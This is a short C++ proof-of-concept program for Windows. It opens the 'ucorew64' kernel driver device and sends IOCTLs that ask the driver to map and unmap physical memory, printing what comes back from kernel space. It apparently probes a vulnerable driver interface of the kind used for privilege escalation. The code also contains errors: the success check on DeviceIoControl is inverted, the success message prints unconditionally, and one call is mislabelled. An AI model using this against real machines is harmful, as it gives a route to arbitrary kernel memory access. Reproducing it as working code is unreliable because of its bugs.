#include <iostream>
#include <Windows.h>
//#include <ntstatus.h>

#define MapPhysicalMemoryToLinearSpace 0xFA002EE8
#define UnmapPhysicalMemory 0xFA002EEC
#define STATUS_SUCCESS 0x0

int main(char argc, char** argv)
{
    HANDLE device = INVALID_HANDLE_VALUE;
    NTSTATUS status = FALSE;
    DWORD bytesReturned = 0;
    CHAR inBuffer[64] = { 0 };
    CHAR outBuffer[64] = { 0 };

    device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

    if (device == INVALID_HANDLE_VALUE)
    {
        printf("> Could not open device: 0x%X\n", GetLastError());
        return FALSE;
    }

    printf("[ ] Calling MapPhysicalMemoryToLinearSpace 0x%X\n", MapPhysicalMemoryToLinearSpace);
    status = DeviceIoControl(device, MapPhysicalMemoryToLinearSpace, inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned, (LPOVERLAPPED)NULL);
    if (status != STATUS_SUCCESS) {
        printf("MapPhysicalMemoryToLinearSpace failed with %X\n", status);
    }
    printf("[*] MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", MapPhysicalMemoryToLinearSpace);
    printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", outBuffer[0], bytesReturned);

    system("pause");

    printf("[ ] Calling MapPhysicalMemoryToLinearSpace 0x%X\n", UnmapPhysicalMemory);
    status = DeviceIoControl(device, UnmapPhysicalMemory, inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned, (LPOVERLAPPED)NULL);
    if (status != STATUS_SUCCESS) {
        printf("UnmapPhysicalMemory failed with %X\n", status);
    }

    system("pause");

    CloseHandle(device);
    return EXIT_SUCCESS;
}